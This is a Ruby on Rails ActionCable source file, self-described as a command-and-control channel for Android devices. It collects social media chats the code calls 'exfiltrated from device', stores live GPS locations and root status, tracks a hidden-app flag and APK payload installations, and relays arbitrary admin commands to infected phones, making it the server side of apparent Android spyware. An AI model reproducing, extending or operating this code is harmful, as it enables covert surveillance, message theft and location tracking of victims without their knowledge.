# Command Channel for C2 communication with Android devices
class CommandChannel < ApplicationCable::Channel
  def subscribed
    reject unless current_user_type == :admin
    @device_id = sanitize_device_id(params[:device_id])
    stream_from "commands_#{@device_id}"
    
    # Mark device as online
    register_device_online
    
    # Auto-create smartphone record for this device
    find_or_create_smartphone
    
    # Flush any queued offline commands for this device
    flush_offline_queue
    
    Rails.logger.info "[CommandChannel] Device #{@device_id} connected"
  end

  def unsubscribed
    # Mark device as offline
    register_device_offline
    Rails.logger.info "[CommandChannel] Device #{@device_id} disconnected"
  end

  # Generic receive handler for messages from device
  def receive(data)
    message_type = data['type']
    payload = data['payload'] || data['data'] || data
    request_id = data['request_id']
    
    Rails.logger.info "[CommandChannel] Received '#{message_type}' from #{@device_id} (request_id: #{request_id})"
    
    # If there's a request_id, update the PendingCommand
    if request_id.present?
      resolve_pending_command(request_id, message_type, payload)
    end
    
    case message_type
    when 'device_info'
      process_device_info(payload)
    when 'location_update'
      location_update(data)
    when 'social_media_chats'
      process_social_media_chats(payload)
    when 'integrity_report'
      process_integrity_report(payload)
    when 'pong'
      pong(data)
    when 'response', 'command_response'
      process_command_response(payload)
    else
      # Still resolve via request_id (handled above), just log unknown types
      Rails.logger.info "[CommandChannel] Response type '#{message_type}' from #{@device_id}"
    end
  rescue StandardError => e
    Rails.logger.error "[CommandChannel] Error processing message: #{e.message}"
    Rails.logger.error e.backtrace.join("\n")
  end

  # Process social media chats exfiltrated from device
  def process_social_media_chats(payload)
    smartphone = find_or_create_smartphone
    messages = payload.is_a?(String) ? JSON.parse(payload) : payload
    
    return unless messages.is_a?(Array)

    messages.each do |msg|
      SocialMediaMessage.create!(
        smartphone: smartphone,
        app_name: msg['app'],
        sender: msg['sender'],
        body: msg['text'],
        sent_at: Time.at(msg['timestamp'].to_i / 1000)
      )
    end

    Rails.logger.info "[CommandChannel] Processed #{messages.size} social media messages from #{@device_id}"
  end

  # Process integrity report from device
  def process_integrity_report(payload)
    smartphone = find_or_create_smartphone
    
    # Store integrity report as a SecurityEvent
    SecurityEvent.create!(
      device_id: @device_id,
      event_type: 'integrity_report',
      severity: payload['overallIntegrity'] ? 'info' : 'high',
      details: payload.to_json,
      detected_at: Time.current
    )

    # Update smartphone status based on report
    smartphone.update(
      is_rooted: payload['isRootDetected'] ? 'true' : 'false'
    )
  end

  # Process device info response
  def process_device_info(payload)
    smartphone = find_or_create_smartphone
    
    name_val = payload['model'] || "Device #{@device_id[0..7]}"
    os_val = "Android #{payload['android_version']}"

    smartphone.update(
      name: name_val.to_s.truncate(255),
      operating_system: os_val.to_s.truncate(100),
      is_rooted: payload['is_rooted'] || false
    )
    
    # Broadcast to admin
    ActionCable.server.broadcast(
      "admin_devices",
      { type: 'device_info', device_id: @device_id, data: payload }
    )
  end

  # Process command response
  def process_command_response(payload)
    ActionCable.server.broadcast(
      "admin_devices",
      { type: 'command_response', device_id: @device_id, data: payload }
    )
  end

  # Receive device info from Android
  def device_info(data)
    smartphone = Smartphone.find_by(device_id: @device_id)
    if smartphone
      name_val = data['model']
      os_val = "Android #{data['os_version']}"

      smartphone.update(
        name: name_val.to_s.truncate(255),
        operating_system: os_val.to_s.truncate(100),
        is_rooted: data['is_rooted'] || false,
        last_seen_at: Time.current
      )
    end
    
    # Broadcast to admin
    ActionCable.server.broadcast(
      "admin_devices",
      { type: 'device_info', device_id: @device_id, data: data }
    )
  end

  # Receive location update from Android
  def location_update(data)
    smartphone = find_or_create_smartphone
    
    location = data['data'] || {}
    latitude = location['latitude']
    longitude = location['longitude']
    timestamp = location['timestamp']
    unless valid_coordinates?(latitude, longitude)
      Rails.logger.warn "[CommandChannel] Invalid coordinates from #{@device_id}: #{latitude}, #{longitude}"
      return
    end
    formatted_time = if timestamp.present?
      Time.at(timestamp.to_i / 1000).strftime('%Y-%m-%d %H:%M:%S')
    else
      Time.current.strftime('%Y-%m-%d %H:%M:%S')
    end

    # Deduplicate by coordinates + timestamp (within 1 second window)
    existing = GeoLocation.where(smartphone: smartphone, lat: latitude.to_s, long: longitude.to_s)
                          .where('created_at > ?', 1.second.ago)
                          .exists?

    unless existing
      GeoLocation.create!(
        smartphone: smartphone,
        lat: latitude,
        long: longitude,
        date: formatted_time
      )
    end
    
    # Broadcast to admin for live map
    ActionCable.server.broadcast(
      "location_#{@device_id}_admin",
      { type: 'location_update', device_id: @device_id, data: data['data'] }
    )
  end

  # Receive pong response from Android
  def pong(data)
    Rails.logger.info "[CommandChannel] Pong from #{@device_id}: #{data}"
    
    ActionCable.server.broadcast(
      "admin_devices",
      { type: 'pong', device_id: @device_id, timestamp: data['timestamp'] }
    )
  end

  # Admin sends command to device
  def send_command(data)
    command = data['command']
    params = data['params'] || {}
    
    ActionCable.server.broadcast(
      "commands_#{@device_id}",
      { type: 'command', action: command, params: params }
    )
    
    Rails.logger.info "[CommandChannel] Command '#{command}' sent to #{@device_id}"
  end

  private

  def resolve_pending_command(request_id, response_type, payload)
    pending = PendingCommand.find_by(request_id: request_id)
    return unless pending && pending.pending?

    # Cross-device verification
    if pending.smartphone&.device_id != @device_id
      Rails.logger.warn "[CommandChannel] Cross-device response blocked: device '#{@device_id}' " \
                        "attempted to complete command for device '#{pending.smartphone&.device_id}' " \
                        "(request_id: #{request_id})"
      return
    end

    Rails.logger.info "[CommandChannel] Resolving PendingCommand #{request_id} with type '#{response_type}'"
    
    response_data = payload.is_a?(Hash) ? payload : { 'data' => payload }
    response_data['response_type'] = response_type
    
    if response_data['error'].present?
      pending.mark_failed(response_data['error'])
    else
      pending.mark_completed(response_data)
    end
  rescue StandardError => e
    Rails.logger.error "[CommandChannel] Error resolving command #{request_id}: #{e.message}"
  end

  def register_device_online
    RedisPool.with do |redis|
      redis.sadd('online_devices', @device_id)
      redis.set("device:#{@device_id}:last_seen", Time.current.to_i)
    end
  rescue => e
    Rails.logger.warn "[CommandChannel] Redis error: #{e.message}"
  end

  def register_device_offline
    RedisPool.with do |redis|
      redis.srem('online_devices', @device_id)
    end
  rescue => e
    Rails.logger.warn "[CommandChannel] Redis error: #{e.message}"
  end

  def find_or_create_smartphone
    # Use DB-level locking to prevent race condition on concurrent connections
    Smartphone.transaction do
      smartphone = Smartphone.find_by(device_id: @device_id)
      return smartphone if smartphone

      payload = ApkPayload.find_or_create_by!(name: 'default') do |apk|
        apk.destination_ip = '0.0.0.0'
        apk.destination_port = '8080'
      end

      installation = ApkInstallation.find_or_create_by!(apk_payload: payload, target_ip: @device_id) do |record|
        record.status = 'connected'
      end

      Smartphone.create!(
        device_id: @device_id,
        apk_installation: installation,
        name: "Device #{@device_id[0..7]}",
        operating_system: 'Android',
        is_rooted: 'Unknown',
        is_app_hidden: 'false'
      )
    end
  rescue ActiveRecord::RecordNotUnique
    # Lost the race — another thread created it first, just find it
    Smartphone.find_by!(device_id: @device_id)
  end

  def sanitize_device_id(device_id)
    device_id.to_s.gsub(/[^a-zA-Z0-9_.:\-]/, '')
  end

  def flush_offline_queue
    OfflineCommandQueue.flush_for_device(@device_id)
  rescue StandardError => e
    Rails.logger.warn "[CommandChannel] Failed to flush offline queue for #{@device_id}: #{e.message}"
  end

  def valid_coordinates?(lat, long)
    lat_f = lat.to_f
    long_f = long.to_f
    lat.present? && long.present? && lat_f.between?(-90, 90) && long_f.between?(-180, 180)
  rescue StandardError
    false
  end
end
